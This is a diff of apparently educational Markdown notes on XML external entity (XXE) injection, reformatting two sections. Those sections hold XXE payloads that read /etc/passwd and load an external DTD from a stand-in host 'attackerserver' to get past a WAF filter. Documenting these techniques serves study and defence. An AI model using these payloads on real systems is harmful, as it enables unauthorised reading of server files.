@@ -204,76 +204,74 @@ Note: It has to be defined before any XML document node begin. This means that w
       </sample>
       ```
 
-4. **External definition**
-
-   Supposed an application configured a WAF to disallow "/etc/passwd" to be sent to the server, the attacker can avoid using "/etc/passwd" in his request by defining entities outside of the injected XML to be included during run-time. 
-
-   External DTD file:
-
-   ```xml-dtd
-   <!ENTITY callme SYSTEM "/etc/passwd">
-   ```
-
-   Definition:
-
-   ```dtd
-   <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
-   %param1;
-   ```
-
-   The above definition would fetch the definition of "callme" from an external server during run-time to be expanded in the following form:
-
-   ```dtd
-   <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
-   <!ENTITY callme SYSTEM "/etc/passwd">
-   ```
-
-   Vulnerable call from original XML:
-
-   ```xml
-   <sample>&callme;</sample>
-   ```
-
-5. **Internal Subset problem**
-
-      Supposed a developer would like to wrap around a parameter entity as follows:
-
-      ```xml
-      <!DOCTYPE document [
-      	<!ENTITY % sample "hello world">
-       	<!ENTITY wrapped "<body>%sample;</body>" >
-      ]>
-      <document>&wrapped;</document>
+   2. **External definition**
+   
+      Supposed an application configured a WAF to disallow "/etc/passwd" to be sent to the server, the attacker can avoid using "/etc/passwd" in his request by defining entities outside of the injected XML to be included during run-time. 
+   
+      External DTD file:
+   
+      ```xml-dtd
+      <!ENTITY callme SYSTEM "/etc/passwd">
       ```
-
-      The above would face an error *"XMLSyntaxError: PEReferences forbidden in internal subset"*.
-
-      In order to define a wrapper, an external entity has to be used.
-
-      external.dtd:
-
+   
+      Definition:
+   
       ```dtd
-      <!ENTITY wrapped "<body>%sample;</body>" >
+      <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
+      %param1;
       ```
-
-      document.xml:
-
+   
+      The above definition would fetch the definition of "callme" from an external server during run-time to be expanded in the following form:
+   
+      ```dtd
+      <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
+      <!ENTITY callme SYSTEM "/etc/passwd">
+      ```
+   
+      Vulnerable call from original XML:
+   
       ```xml
-      <!DOCTYPE document [
-      	<!ENTITY % sample "hello world">
-       	<!ENTITY % dtd SYSTEM "external.dtd">
-      	%dtd;
-      ]>
-      <document>&wrapped;</document>
+      <sample>&callme;</sample>
       ```
-
-      Output:
-
-      ```xml
-      <document><body>hello world</body></document> 
-      ```
-
-      
+   
+   3. **Internal Subset problem**
+   
+         Supposed a developer would like to wrap around a parameter entity as follows:
+   
+         ```xml
+         <!DOCTYPE document [
+         	<!ENTITY % sample "hello world">
+          	<!ENTITY wrapped "<body>%sample;</body>" >
+         ]>
+         <document>&wrapped;</document>
+         ```
+   
+         The above would face an error *"XMLSyntaxError: PEReferences forbidden in internal subset"*.
+   
+         In order to define a wrapper, an external entity has to be used.
+   
+         external.dtd:
+   
+         ```dtd
+         <!ENTITY wrapped "<body>%sample;</body>" >
+         ```
+   
+         document.xml:
+   
+         ```xml
+         <!DOCTYPE document [
+         	<!ENTITY % sample "hello world">
+          	<!ENTITY % dtd SYSTEM "external.dtd">
+         	%dtd;
+         ]>
+         <document>&wrapped;</document>
+         ```
+   
+         Output:
+   
+         ```xml
+         <document><body>hello world</body></document> 
+         ```
 
 ### Observations
 
